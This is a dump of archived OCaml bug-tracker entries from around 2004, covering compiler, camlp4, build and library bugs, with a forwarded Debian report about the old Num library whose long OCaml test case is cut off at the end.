normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: 3.07+13 (2004-01-04) from CVS\nOS: Red Hat Linux 7.3\nSubmission from: charter-242-037.caltech.edu (131.215.242.37)\n\n\nI am getting Out_of_memory exceptions (both on a P-III with 512 MB of RAM and\nAMD Opteron with 16 GB of RAM) running code that works correctly with 3.06. Any\nideas what could be causing this?\n\nThe backtraces I am getting look like\n\nFatal error: exception Out_of_memory\nRaised at file \"\", line 1, character 5527\nCalled from file \"\", line 1, character 5337\nRe-raised at file \"\", line 1, character 5001\nCalled from file \"\", line 1, character 48833\nCalled from file \"\", line 1, character 17283\nCalled from file \"\", line 1, character 5079\nCalled from file \"\", line 1, character 6548\nRe-raised at file \"\", line 1, character 5927\nCalled from file \"\", line 1, character 7701\nCalled from file \"\", line 1, character 1471\n\nbecause of #8436, so I am not sure where exactly the problem comes from.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2022\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: 3.07+13 (2004-01-04) from CVS\nOS: Red Hat Linux 7.3\nSubmission from: charter-242-037.caltech.edu (131.215.242.37)\n\n\nIn the current CVS version of OCaml, if a file is preprocessed with camlp4, then\nthe debugging information (such as the one printed in OCAMLRUNPARAM=b\nbacktraces) has an empty file name. This used to work correctly in 3.06.\n\n% cat test.ml\nlet _ = List.nth [] 1;;\n% ocamlc -g -custom test.ml\n% env OCAMLRUNPARAM=b ./a.out\nFatal error: exception Failure(\"nth\")\nCalled from file \"test.ml\", line 1, character 21\n% ocamlc -pp camlp4o -g -custom test.ml\n% env OCAMLRUNPARAM=b ./a.out\nFatal error: exception Failure(\"nth\")\nCalled from file \"\", line 1, character 21\n% ocamlc -v\nThe Objective Caml compiler, version 3.07+13 (2004-01-04)\nStandard library directory: /usr/lib/ocaml\n% uname -a\nLinux tehachapi.cs.caltech.edu 2.4.20-24.7 #1 Mon Dec 1 13:35:11 EST 2003 i686\nunknown\n% cat /etc/redhat-release\nRed Hat Linux release 7.3 (Valhalla)\n"},{"labels":["bug"],"text":"**Original bug ID:** 2021\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: 3.07+13 (2004-01-04) from CVS\nOS: Red Hat Linux 7.3\nSubmission from: charter-242-037.caltech.edu (131.215.242.37)\n\n\nWhen trying to build OCaml, I am getting:\n\n...\n\nmake[1]: Entering directory `/mnt/spool/nogin/rpmBUILD/ocaml/otherlibs/dynlink'\n../../boot/ocamlrun ../../ocamlc -c -warn-error A -I ../../stdlib -I ../../utils\n-I ../../typing -I ../../bytecomp dynlink.mli\n../../boot/ocamlrun ../../ocamlc -c -warn-error A -I ../../stdlib -I ../../utils\n-I ../../typing -I ../../bytecomp dynlink.ml\n../../boot/ocamlrun ../../ocamlc -warn-error A -I ../../stdlib -I ../../utils -I\n../../typing -I ../../bytecomp -a -o dynlink.cma misc.cmo config.cmo tbl.cmo\nclflags.cmo consistbl.cmo ident.cmo path.cmo types.cmo btype.cmo predef.cmo\nruntimedef.cmo bytesections.cmo dll.cmo symtable.cmo opcodes.cmo meta.cmo\ndynlink.cmo\n../../boot/ocamlrun ../../ocamlc -c -warn-error A -I ../../stdlib -I ../../utils\n-I ../../typing -I ../../bytecomp extract_crc.ml\n../../boot/ocamlrun ../../ocamlc -warn-error A -I ../../stdlib -I ../../utils -I\n../../typing -I ../../bytecomp -o extract_crc dynlink.cma extract_crc.cmo\nError while linking dynlink.cma(Misc):\nReference to undefined global `Assert_failure'\nmake[1]: *** [extract_crc] Error 2\nmake[1]: Leaving directory `/mnt/spool/nogin/rpmBUILD/ocaml/otherlibs/dynlink'\nmake: *** [otherlibraries] Error 2\n"},{"labels":["bug"],"text":"**Original bug ID:** 2020\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: 3.07+12 (2004-01-03) from CVS\nOS: Fedora Core Development\nSubmission from: charter-242-037.caltech.edu (131.215.242.37)\n\n\nmatrix41:/tmp> ocamlc -custom test.ml\n/usr/lib64/ocaml/libcamlrun.a(dynlink.o)(.text+0x15): In function\n`lookup_primitive':\n: undefined reference to `caml_names_of_builtin_cprim'\n/usr/lib64/ocaml/libcamlrun.a(dynlink.o)(.text+0x1e): In function\n`lookup_primitive':\n: undefined reference to `caml_names_of_builtin_cprim'\n/usr/lib64/ocaml/libcamlrun.a(dynlink.o)(.text+0x3a): In function\n`lookup_primitive':\n: undefined reference to `caml_builtin_cprim'\n/usr/lib64/ocaml/libcamlrun.a(dynlink.o)(.text+0x49): In function\n`lookup_primitive':\n: undefined reference to `caml_names_of_builtin_cprim'\n/usr/lib64/ocaml/libcamlrun.a(startup.o)(.text+0x3b9): In function\n`parse_command_line':\n: undefined reference to `caml_names_of_builtin_cprim'\n/usr/lib64/ocaml/libcamlrun.a(startup.o)(.text+0x3c1): In function\n`parse_command_line':\n: undefined reference to `caml_names_of_builtin_cprim'\n/usr/lib64/ocaml/libcamlrun.a(startup.o)(.text+0x89b): In function\n`caml_startup_code':\n: undefined reference to `caml_builtin_cprim'\ncollect2: ld returned 1 exit status\nError while building custom runtime system\nExit 2\n\nmatrix41:/tmp> cat test.ml\nprint_string \"foo\\n\";;\n\nmatrix41:/tmp> ocamlc -version\n3.07+12 (2004-01-03)\n\nmatrix41:/tmp> uname -a\nLinux matrix41.cs.caltech.edu 2.6.0-1.21smp #1 SMP Tue Dec 23 19:47:04 EST 2003\nx86_64 x86_64 x86_64 GNU/Linux\n"},{"labels":["bug"],"text":"**Original bug ID:** 2019\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: 3.07+12 (2004-01-03) from CVS\nOS: Fedora Core Development\nSubmission from: charter-242-037.caltech.edu (131.215.242.37)\n\n\nSummary: It seems that on AMD64 the input_binary_int function is capable of\nreading an integer that's different from what was passed to output_binary_int.\n\nOne would expect that teh following code:\n\nlet f = open_out_bin \"/tmp/foo\";;\noutput_binary_int f i;;\nclose_out f;;\nlet f = open_in_bin \"/tmp/foo\";;\nlet i' = input_binary_int f;;\nclose_in f;;\ni' = i;;\n\nWould output \"true\" for any int i. However this is not the case on AMD64:\n\nmatrix41:~> ocaml\n        Objective Caml version 3.07+12 (2004-01-03)\n\n# let i = 0x89ac12bd;;\nval i : int = 2309755581\n# let f = open_out_bin \"/tmp/foo\";;\nval f : out_channel = <abstr>\n# output_binary_int f i;;\n- : unit = ()\n# close_out f;;\n- : unit = ()\n# let f = open_in_bin \"/tmp/foo\";;\nval f : in_channel = <abstr>\n# let i' = input_binary_int f;;\nval i' : int = -1985211715\n# close_in f;;\n- : unit = ()\n# i' == i;;\n- : bool = false\n# i' = i;;\n- : bool = false\n\nwhile the same thing works \"correctly\" on a 32-bit machine - at least with\n3.06:\n\n        Objective Caml version 3.06\n\n# let i = 0x89ac12bd;;\nval i : int = 162271933\n# let f = open_out_bin \"/tmp/foo\";;\nval f : out_channel = <abstr>\n# output_binary_int f i;;\n- : unit = ()\n# close_out f;;\n- : unit = ()\n# let f = open_in_bin \"/tmp/foo\";;\nval f : in_channel = <abstr>\n# let i' = input_binary_int f;;\nval i' : int = 162271933\n# close_in f;;\n- : unit = ()\n# i' = i;;\n- : bool = true\n\nOn another 32-bit machine:\n\n       Objective Caml version 3.07+7 (2003-12-17)\n\n# let i = 0x89ac12bd;;\nInteger literal exceeds the range of representable integers of type int\n\nWhich is IMO pretty reasonable.\n"},{"labels":["bug"],"text":"**Original bug ID:** 2018\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jim Farrand\nVersion: 3.07+2\nOS: Gentoo GNU/Linux\nSubmission from: 81-178-234-70.dsl.pipex.com (81.178.234.70)\n\n\nA type which is valid in the old syntax, but when converted to the revised\nsyntax with camlp4 is not accepted by the compiler.\n\nPut the following type in the file bad_o.mli:\n\nval foo : (< bar : unit; .. > as 'a) -> 'a\n\nThis can be compiled trivially by ocamlc.  Convert to the revised syntax with\nthe following command:\n\ncamlp4o pr_r.cmo bad_o.mli >bad_r.mli\n\nWe get  the following type in the revised syntax:\n\nvalue foo : (< bar : unit; .. > as 'a) -> 'a;\n\nHowever, this type is not accepted by the compiler:\n\nocamlc -pp camlp4r bad_r.mli\nFile \"bad_r.mli\", line 2, characters 27-29:\nParse error: [field] expected after ';' (in [type])\nPreprocessor error\n\nI'm not sure if this is a bug in the printer (pr_r.cmo) or the parser\n(pa_r.cmo).\n"},{"labels":["bug"],"text":"**Original bug ID:** 2017\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi,\n\nwhen I try to compile my ocaml program under Linux (Mandrake) with Ocaml \n3.07+2 I get an assertion failure in the compiler:\n\nFatal error: exception Assert_failure(\"bytecomp/translcore.ml\",612,14)\n\nThe same program compiles and works fine under Ocaml 3.06 (cygwin)\n\nI couldn't find anything similar on the bug web site \n(http://caml.inria.fr/bin/caml-bugs) But I didn't venture deeply into \nthe french bug reports ;)\n\nI can provide a code sample that produces this on demand.\n\nSo my question is:\nis it something known, or something new ?\nand if so, is there a workaround ?\n\nTIA,\n\nRomain Slootmaekers\n"},{"labels":["bug"],"text":"**Original bug ID:** 2016\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: CVS - 3.07+11 (2004-01-02)\nOS: Fedora Core Development\nSubmission from: charter-242-037.caltech.edu (131.215.242.37)\n\n\nWhen trying to compile the current CVS version of OCaml on AMD64, I get:\n\n...\n\ngcc -DCAML_NAME_SPACE -O -fno-defer-pop -Wall -Wno-unused -D_FILE_OFFSET_BITS=64\n-D_REENTRANT   -c -o prims.o prims.c\ngcc -fno-defer-pop -Wall -Wno-unused -D_FILE_OFFSET_BITS=64 -D_REENTRANT -Wl,-E\n-o ocamlrun \\\n          prims.o libcamlrun.a -lm  -ldl -lcurses -lpthread\nlibcamlrun.a(memory.o)(.text+0x60): In function `caml_free_for_heap':\n: undefined reference to `aligned_caml_munmap'\ncollect2: ld returned 1 exit status\nmake[1]: *** [ocamlrun] Error 1\n"},{"labels":["bug"],"text":"**Original bug ID:** 2008\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nI just use this thread to ask again a question ...\n\nHow to compute the best or at least a very good float interval \ncontaining a rational number with the num library ?\n\nThe float_of-num function is really not convincing (it is very slow \nbecause it does a translation to a decimal representation as string and \nlook at all the digits !).\n\nRemark: it should be possible to find a very good (may be not always the \nbest) float interval in constant time !\n\nThis is usefull to implement lazy arithmetics (you compute with floating \npoint interval until this is not enough and then you compute the exact \nvalue. But it is useful in some cases to compute an interval from the\nrational number and it needs to be fast to be useful)\n\n\n-- \nChristophe Raffalli\nUniversitÃ© de Savoie\nBatiment Le Chablais, bureau 21\n73376 Le Bourget-du-Lac Cedex\n\ntÃ©l: (33) 4 79 75 81 03\nfax: (33) 4 79 75 87 42\nmail: Christophe.Raffalli@univ-savoie.fr\nwww: http://www.lama.univ-savoie.fr/~RAFFALLI\n---------------------------------------------\nIMPORTANT: this mail is signed using PGP/MIME\nAt least Enigmail/Mozilla, mutt or evolution\ncan check this signature\n---------------------------------------------\n\n----------------\n-----BEGIN PGP SIGNATURE-----\nVersion: GnuPG v1.2.3 (GNU/Linux)\nComment: Using GnuPG with Mozilla - http://enigmail.mozdev.org\n\niD8DBQE/8WCkSQDyWB/+xBwRAsKeAJ9oGYH9XHpOn6J3ZugwJreTou5h2wCePRrP\nEPENzee137oKUi1A+nVhcF4=\n=bN8A\n-----END PGP SIGNATURE-----\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1997\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nA tout hasard !!!!!!!!!!!!!!!!!\n  Lors de la recuperation du compilateur je ne dispose que de l'Ã©diteur CAML. Les fonctions permettant de compiler , de faire l'Ã©dition de lien et d'exÃ©cuter sont introuvables. Est-ce normal ?\n\n  La rÃ©ponse Ã  cette demande d'aide Ã©tant inattendue elle ne pourra Ãªtre qu'une heureuse surprise et je vous en remercie par avance ....\n A toutes fins utiles   Compilateur OCAML recupÃ©rÃ© 3.04 . Configuration WINDOWS 95 \n\n----------------\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n<HTML><HEAD>\n<META content=\"text/html; charset=iso-8859-1\" http-equiv=Content-Type>\n<META content=\"MSHTML 5.00.2314.1000\" name=GENERATOR>\n<STYLE></STYLE>\n</HEAD>\n<BODY bgColor=#c0c0c0>\n<DIV><FONT face=Arial size=2>A tout hasard !!!!!!!!!!!!!!!!!</FONT></DIV>\n<DIV><FONT face=Arial size=2>&nbsp; Lors de la recuperation du compilateur je ne \ndispose que de l'Ã©diteur CAML. Les fonctions permettant de compiler , de faire \nl'Ã©dition de lien et d'exÃ©cuter sont introuvables. Est-ce normal ?</FONT></DIV>\n<DIV>&nbsp;</DIV>\n<DIV><FONT face=Arial size=2>&nbsp; La rÃ©ponse Ã  cette demande d'aide Ã©tant \ninattendue elle ne pourra Ãªtre qu'une heureuse surprise et je vous en remercie \npar avance ....</FONT></DIV>\n<DIV><FONT face=Arial size=2>&nbsp;A toutes fins utiles&nbsp;&nbsp; Compilateur \nOCAML recupÃ©rÃ© 3.04 . Configuration WINDOWS 95 </FONT></DIV></BODY></HTML>\n\n----------------\n----------------\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1994\n**Reporter:** administrator\n**Status:** closed (set by @xavierleroy on 2006-06-17T09:56:17Z)\n**Resolution:** won't fix\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Nuutti Kotivuori\r\nVersion: 3.07+7 (2003-12-17)\r\nOS: Debian GNU/Linux\r\nSubmission from: aka.pp.htv.fi (213.243.183.115)\r\n\r\n\r\nI stumbled on a rather nasty condition in Hashtbl that will cause a \r\nstack overflow with a bit bigger than normal data amounts. \r\n \r\nA snippet that demonstrates this: \r\n,---- \r\n| let tbl = Hashtbl.create 10 in \r\n|   for i = 0 to 100000 do \r\n|     Hashtbl.add tbl 1 \"test\" \r\n|   done;; \r\n`---- \r\n \r\nThe bug is as follows - hash table resizing has a recursive function \r\ncalled to migrate a single bucket to the new table and it is not tail \r\nrecursive. \r\n \r\nHere's the bit of code: \r\n,----[ hashtbl.ml ] \r\n| let resize hashfun tbl = \r\n|   let odata = tbl.data in \r\n|   let osize = Array.length odata in \r\n|   let nsize = min (2 * osize + 1) Sys.max_array_length in \r\n|   if nsize <> osize then begin \r\n|     let ndata = Array.create nsize Empty in \r\n|     let rec insert_bucket = function \r\n|         Empty -> () \r\n|       | Cons(key, data, rest) -> \r\n|           insert_bucket rest; (* preserve original order of elements *) \r\n|           let nidx = (hashfun key) mod nsize in \r\n|           ndata.(nidx) <- Cons(key, data, ndata.(nidx)) in \r\n|     for i = 0 to osize - 1 do \r\n|       insert_bucket odata.(i) \r\n|     done; \r\n|     tbl.data <- ndata; \r\n|   end \r\n`---- \r\n \r\nIn here, insert_bucket obviously isn't tail recursive. \r\n \r\nSo what it means is that if even a rather meager amount of values \r\nhappens to get stuffed in the same hash bucket, it will cause a\r\nstack overflow. \r\n\r\nI ran into this while using some of the standard bits in OCaml that \r\ninternally used a Hashtbl - so this ended up as a real and actual \r\nproblem. \r\n \r\n-- Naked\n"},{"labels":["bug"],"text":"**Original bug ID:** 1991\n**Reporter:** administrator\n**Status:** closed (set by @damiendoligez on 2008-01-18T15:06:39Z)\n**Resolution:** unable to duplicate\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: George Necula\r\nVersion: 3.07+2\r\nOS: Windows+cygwin\r\nSubmission from: adsl-63-203-76-11.dsl.snfc21.pacbell.net (63.203.76.11)\r\n\r\n\r\n\r\n I have just installed the latest 3.07+2 and any attempt to use camlp4 results\r\nin a segfault: \r\n\r\n ocamlc -pp camlp4o test.ml\r\n\r\n where test.ml contains a single line: \r\nprint_string \"Hello world!\";;\r\n\r\n I am using cygwin. I compiled from source.\r\n\r\n The current directory is mounted in textmode. \r\n\r\n I get a ocamlrun.exe.stackdump, which suggests that ocamlrun.exe is crashing.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1990\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Martin Jambon\nVersion: 3.07+2\nOS: Linux\nSubmission from: f03v-10-10.d1.club-internet.fr (212.194.45.10)\n\n\n$ cat test.ml\nlet f =\n  if true then\n    (fun x ->\n       if true then print_int x)\n  else\n    print_int\n\n\n$ camlp4o pr_o.cmo test.ml\nlet f = if true then fun x -> if true then print_int x else print_int\n\nWhich is the same as:\n  let f = if true then (fun x -> if true then print_int x else print_int)\n\nBut it should be: \n  let f = if true then (fun x -> if true then print_int x) else print_int\n"},{"labels":["bug"],"text":"**Original bug ID:** 1989\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nSalut.\n\nJe vous transmet ce bug report concernant l'ancienne implementation de\nbignum. Je ne sais pas si cela vous interesse encore, mais comme\nl'ancienne bignum est encore dans la version releaser de ocaml, ...\n\nAmicalement,\n\nSven Luther\n\n----- Forwarded message from Thomas Fischbacher <Thomas.Fischbacher@Physik.Uni-Muenchen.DE> -----\n\nEnvelope-to: luther@localhost\nDelivery-date: Thu, 18 Dec 2003 22:24:08 +0100\nX-Sieve: Server Sieve 2.2\nSubject: Bug#224417: Problem with the old Num implementation of ocaml\nReply-To: Thomas Fischbacher <Thomas.Fischbacher@Physik.Uni-Muenchen.DE>,\n\t224417@bugs.debian.org\nResent-From: Thomas Fischbacher <Thomas.Fischbacher@Physik.Uni-Muenchen.DE>\nResent-To: debian-bugs-dist@lists.debian.org\nResent-Cc: Sven Luther <luther@debian.org>\nResent-Date: Thu, 18 Dec 2003 20:33:04 UTC\nResent-Message-ID: <handler.224417.B.107177910414660@bugs.debian.org>\nX-Debian-PR-Message: report 224417\nX-Debian-PR-Package: ocaml\nX-Debian-PR-Keywords: \nFrom: Thomas Fischbacher <Thomas.Fischbacher@Physik.Uni-Muenchen.DE>\nTo: submit@bugs.debian.org\nCc: Marc Schaefer <mschaefer@uni-duisburg.de>,\n\tKlaus Aehlig <aehlig@rz.mathematik.uni-muenchen.de>,\n\tWolfram Krause <krause@th.physik.uni-frankfurt.de>,\n\tsteffen.grunewald@aei.mpg.de\nX-BOFH: Daemons did it\nX-Scanned-By: MIMEDefang 2.37\nX-Spam-Checker-Version: SpamAssassin \n\t2.60-master.debian.org_2003_11_25-bugs.debian.org_2003_12_15 \n\t(1.212-2003-09-23-exp) on master.debian.org\nX-Spam-Status: No, hits=-3.4 required=4.0 tests=HAS_PACKAGE,LARGE_HEX \n\tautolearn=no \n\tversion=2.60-master.debian.org_2003_11_25-bugs.debian.org_2003_12_15\nX-Spam-Level: \nResent-Sender: Debian BTS <debbugs@master.debian.org>\nX-Spam: no; 0.00; uni-muenchen:01 readable:01 unreadable:01 mime-aware:01 docserver:01 3.06:01 severity:01 grave:01 string:01 int:01 -type:01 integer:01 interpreter:01 unix:01 module:01 \nX-Attachments: name=\"ym-debug.ml\" name=\"ym-debug.ml\" \n\n\nPackage:  ocaml \nVersion: 3.06-21\nSeverity: grave\n\n\nPlease note that this bug concerns the \"old\" Num implementation that was \nremoved in a recent update. I nevertheless use(d) it as I am right \nnow doing research for a new string theory paper and wanted to \nconsistently use one and the same somewhat environment throughout the \nprocess. Nevertheless, I suppose this affects all versions having the old num \nimplementation (next thing I'll do is to upgrade my entire system to the \nnew implementation and check the behaviour of that one for some large test \ncalculations).\n\nThe attachment will reproduce a condition where doing the same calculation \n(which is purely functional to the outside and does not use global state \nor side effects, but involves Num) many times in sequence will give \ndifferent results.\n\nAs you see, about half of this file is data; I did not manage to find a \nsmaller test case creating that condition. Although I consider this highly\nunlikely, this piece of code may involve an \"int\"-type related integer \noverflow. (Nevertheless, even so, subsequent identical calculations should \nnot give different results...)\n\n\nOn my system(*), the output of a num_ocaml interpreter built as described \nin the Num section of the documentation, but also including the Unix \nmodule is:\n\n0 ==> -12747938802280433395210374808335212773156996019062242486412495785350259890027861091589626807758181401556588623046875/764762496031801254357991532266868085634832685275244705613839817948600630474284529321916381431208558769420593384116260078281979735715302794541235545562947747053568\n1 ==> -24799801902139948285742077521010897923261300584495629346339410063333039539280530883995185222932342824043982837509521484375/4156317913216311164989084414493848291493655898235025573988259880155438209099372441966936855604394341138155398826718804773271628998452732579028454051972542103552\n2 ==> -39148920061803210956691061036397438426365134774540146675772774556810648122275561412271743926625375084180283661376953125/2294287488095403763073974596800604256904498055825734116841519453845801891422853587965749144293625676308261780152348780234845939207145908383623706636688843241160704\n3 ==> -39148920061803210956691061036397438426365134774540146675772774556810648122275561412271743926625375084180283661376953125/2294287488095403763073974596800604256904498055825734116841519453845801891422853587965749144293625676308261780152348780234845939207145908383623706636688843241160704\n4 ==> -24799801902139948285742077521010897923261300584495629346339410063333039539280530883995185222932342824043982837509521484375/4156317913216311164989084414493848291493655898235025573988259880155438209099372441966936855604394341138155398826718804773271628998452732579028454051972542103552\n5 ==> -24799801902139948285742077521010897923261300584495629346339410063333039539280530883995185222932342824043982837509521484375/4156317913216311164989084414493848291493655898235025573988259880155438209099372441966936855604394341138155398826718804773271628998452732579028454051972542103552\n6 ==> -39148920061803210956691061036397438426365134774540146675772774556810648122275561412271743926625375084180283661376953125/2294287488095403763073974596800604256904498055825734116841519453845801891422853587965749144293625676308261780152348780234845939207145908383623706636688843241160704\n7 ==> -39148920061803210956691061036397438426365134774540146675772774556810648122275561412271743926625375084180283661376953125/2294287488095403763073974596800604256904498055825734116841519453845801891422853587965749144293625676308261780152348780234845939207145908383623706636688843241160704\n8 ==> -39148920061803210956691061036397438426365134774540146675772774556810648122275561412271743926625375084180283661376953125/2294287488095403763073974596800604256904498055825734116841519453845801891422853587965749144293625676308261780152348780234845939207145908383623706636688843241160704\n9 ==> 0\n- : unit = ()\n\nThe correct result is zero.\n\n(*) uname -a\n\nLinux djinn 2.4.23 #6 Thu Dec 4 18:13:28 CET 2003 i686 GNU/Linux\n\n\nI would like to know whether this can be confirmed.\n\n-- \nregards,                  tf@cip.physik.uni-muenchen.de              (o_\nDr. Thomas Fischbacher -  http://www.cip.physik.uni-muenchen.de/~tf  //\\\n(lambda (n) ((lambda (p q r) (p p q r)) (lambda (g x y)              V_/_\n(if (= x 0) y (g g (- x 1) (* x y)))) n 1))                     (Debian GNU)\nopen Num;;\n\nlet int1=Int 1;; (* To avoid number consing later on... *)\nlet int0=Int 0;; \nlet int2=Int 2;; \n\ntype lpower =\n    {mutable power: int;\n     mutable vars: int; (* bit vector *)\n     mutable coeffs: int array (* always make denominators rational *)\n   };;\n\nlet power_of_2 n =\n  let rec trav p ppow =\n    if ppow>n\n    then -1\n    else if ppow<n\n    then trav (1+p) (ppow+ppow)\n    else p\n  in trav 0 1;;\n\n(*\n   We need an order on lpowers...\n *)\n\nlet v_cmp cmp a b =\n  let len_a = Array.length a in\n  let len_b = Array.length b in\n  let rec trav pos =\n    if pos == len_a\n    then\n      if len_a == len_b then 0 else -1\n    else\n      if pos == len_b\n      then 1\n      else\n\tlet xa = Array.get a pos in\n\tlet xb = Array.get b pos in\n\tlet cmp_xa_xb = cmp xa xb in\n\tif cmp_xa_xb != 0 then cmp_xa_xb else trav (1+pos)\n  in trav 0;;\n\n\n(* \n   Example:\n\n   v_cmp (fun x y -> if x < y then -1 else if x > y then 1 else 0) [|1;2;3;4;8|] [|1;2;3;4|];;\n *)\n\n\nlet lpower_cmp also_cmp_powers lp_a lp_b =\n  if lp_a.vars < lp_b.vars then -1\n  else if lp_a.vars > lp_b.vars then 1\n  else let cmp =\n    v_cmp (fun x y -> if x < y\n                       then -1\n                       else if x > y then 1\n                       else 0)\n      lp_a.coeffs lp_b.coeffs in\n  if cmp != 0 then cmp\n      else\n       if also_cmp_powers\n       then if lp_a.power < lp_b.power then -1\n            else if lp_a.power > lp_b.power then 1\n            else 0\n       else 0;;\n\n(*\n   When combining lpower vectors,\n   we first have to count the number of different entries...\n *)\n\n\nlet lpower_nr_different_noncancellating v_lp_a v_lp_b =\n  let len_a = Array.length v_lp_a in\n  let len_b = Array.length v_lp_b in\n  let rec trav n_so_far pos_a pos_b =\n    if pos_a == len_a then n_so_far + len_b-pos_b\n\telse if pos_b == len_b then n_so_far + len_a-pos_a\n\telse\n\t  let entry_a = Array.get v_lp_a pos_a in\n\t  let entry_b = Array.get v_lp_b pos_b in\n\t  let cmp_here = lpower_cmp false entry_a entry_b in\n\t  if cmp_here == 0 then\n\t    if entry_a.power + entry_b.power == 0\n\t    then trav n_so_far (1+pos_a) (1+pos_b)\n\t    else trav (1+n_so_far) (1+pos_a) (1+pos_b)\n\t  else if cmp_here == -1 then trav (1+n_so_far) (1+pos_a) pos_b\n\t  else trav (1+n_so_far) pos_a (1+pos_b)\n  in trav 0 0 0;;\n\n\n(*\n   We will make good use of lpower substitution not only\n   for doing calculations, but also for constructing\n   the initial terms.\n *)\n\n(*\n\n   First of all, we need integer bitmask functions...\n\n *)\n\nlet integer_length n =\n  let rec trav rest_n bit_now =\n  if rest_n == 0\n  then bit_now\n  else\n    let contrib = 1 lsl bit_now in\n    if 0 == contrib land rest_n\n    then trav rest_n (1+bit_now)\n    else trav (rest_n-contrib) (1+bit_now)\n  in trav n 0;;\n\nlet nr_bits_in n =\n  let rec trav rest_n bit_now nr =\n  if rest_n == 0\n  then nr\n  else\n    let contrib = 1 lsl bit_now in\n    if 0 == contrib land rest_n\n    then trav rest_n (1+bit_now) nr\n    else trav (rest_n-contrib) (1+bit_now) (1+nr)\n  in trav n 0 0;;\n\n\n(* Given a number and a value 2^bit, tell me the how manyth set bit\n   in the number it is, starting to count at 0... *)\n\nlet nr_bits_set_before num bitpow =\n  let rec walk nr val_now =\n    if val_now == bitpow\n    then nr\n    else walk (if (0==val_now land num) then nr else nr+1)\n\t(val_now+val_now)\n  in walk 0 1;;\n\n(* ... and some other helpers... *)\n\nlet gcd a b =\n  let rec work p q =\n    let mpq = p mod q in\n    if mpq==0 then q else work q mpq\n  in\n  let aa = abs a in\n  let ab = abs b in\n  if aa > ab then work aa ab else work ab aa;;\n\n\nlet v_gcd v_int =\n  let len = Array.length v_int in\n  if len == 0\n   then 1\n   else if len == 1 then abs (Array.get v_int 0)\n   else let rec trav pos gcd_now =\n     if gcd_now==1 then 1\n     else if pos==len then gcd_now\n     else trav (1+pos) (gcd gcd_now (Array.get v_int pos))\n   in trav 1 (Array.get v_int 0);;\n\n\nlet lcm a b = abs(a*b/(gcd a b));;\n\n(*\n\n   Here, quite some interesting things do happen...\n\n   Note that the given var MUST occur in the substitution rule...\n\n   We desructively change the extra factors in ref_numer and ref_denom\n   in order to be able to keep our coeffs integral and stay fast...\n\n   Note that one has to convince oneself that, by looking at the given\n   structures of the terms showing up, we do not leave integer range\n   by applying #r substitutions of linear functions with coeffs max. 2\n   (and what one can get from that in consecutive subs) as well as\n   powers up to 2^r...\n   \n   Now, how big can we make r before violating these constraints...?\n\n   XXX Note: need another variant, where we do not cons the result,\n   but instead just eval it!\n\n *)\n\n\nlet get_coeff lp coeff_bitpow =\n  let pos = nr_bits_set_before lp.vars coeff_bitpow in\n  Array.get lp.coeffs pos;;\n\n\nlet lpower_subs ref_xfactor var_bitpow to_subs lp =\n  if (var_bitpow land lp.vars) == 0 then lp (* nothing to substitute *)\n  else\n    let subs_other_vars = var_bitpow lxor to_subs.vars in\n    let lp_other_vars = var_bitpow lxor lp.vars in\n    let total_vars = subs_other_vars lor lp_other_vars in\n    let pos_var_in_lp = nr_bits_set_before lp.vars var_bitpow in\n    let pos_var_in_subs = nr_bits_set_before to_subs.vars var_bitpow in\n    let var_coeff_in_lp = Array.get lp.coeffs pos_var_in_lp in\n    let var_coeff_in_subs = Array.get to_subs.coeffs pos_var_in_subs in\n    let var_coeff = lcm var_coeff_in_lp var_coeff_in_subs in\n    let factor_subs = -var_coeff/var_coeff_in_subs in\n    let factor_lp = var_coeff/var_coeff_in_lp in\n    let nr_total_vars = nr_bits_in total_vars in (* May still be reduced by additional cancellations! *)\n    let result_coeffs = Array.make nr_total_vars 0 in\n    let rec fill_result bitpow result_pos true_result_vars =\n      if bitpow > total_vars\n      then (* finished -- but may have to take 